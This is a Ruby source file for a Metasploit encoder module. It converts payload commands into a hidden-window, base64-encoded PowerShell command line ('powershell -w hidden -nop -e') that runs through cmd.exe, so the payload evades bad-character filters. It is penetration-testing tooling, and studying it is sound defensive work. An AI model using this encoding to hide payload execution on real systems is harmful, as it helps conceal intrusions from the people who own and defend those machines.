##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder
  Rank = ExcellentRanking

  include Msf::Post::Windows

  def initialize
    super(
      'Name' => 'Powershell Base64 Command Encoder',
      'Description' => %q{
        This encodes the command as a base64 encoded command for powershell.
      },
      'Author' => 'Ben Campbell',
      'Arch' => ARCH_CMD,
      'Platform' => 'win')
  end

  #
  # Encodes the payload
  #
  def encode_block(state, buf)
    # Skip encoding for empty badchars
    if state.badchars.empty?
      return buf
    end

    if (state.badchars.include? '-') || (state.badchars.include? ' ')
      return buf
    end

    cmd = encode_buf(buf)

    if state.badchars.include? '='
      while cmd.include? '='
        buf << ' '
        cmd = encode_buf(buf)
      end
    end

    cmd
  end

  def encode_buf(buf)
    base64 = Rex::Text.encode_base64(Rex::Text.to_unicode("cmd.exe /c '#{Msf::Post::Windows.escape_powershell_literal(buf)}'"))
    "powershell -w hidden -nop -e #{base64}"
  end
end
